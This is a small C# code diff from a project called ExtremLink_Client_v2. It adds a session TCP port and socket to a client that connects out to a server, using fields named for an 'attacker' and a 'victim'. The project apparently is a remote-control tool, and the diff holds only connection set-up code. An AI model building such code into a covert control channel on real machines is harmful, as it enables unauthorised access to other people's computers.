@@ -30,6 +30,7 @@ namespace ExtremLink_Client_v2.Classes
         // Integer constants which represent the sockets' ports:
         public readonly int ATTACKER_TCP_PORT = 1234;
         public readonly int ATTACKER_UDP_PORT = 1235;
+        public readonly int ATTACKER_SESSION_TCP_PORT = 1236;
 
         // A string which represent the victim's IP address:
         private string victimIpAddr;
@@ -79,6 +80,7 @@ namespace ExtremLink_Client_v2.Classes
             this.serverIpAddr = serverIpAddr;
             this.tcpSocket.Connect(new IPEndPoint(IPAddress.Parse(this.serverIpAddr), this.ATTACKER_TCP_PORT));
             this.udpSocket.Bind(new IPEndPoint(IPAddress.Parse(this.serverIpAddr), this.ATTACKER_UDP_PORT));
+            this.sessionTcpSocket.Connect(new IPEndPoint(IPAddress.Parse(this.serverIpAddr), this.ATTACKER_SESSION_TCP_PORT));
         }
 
         public void Start()
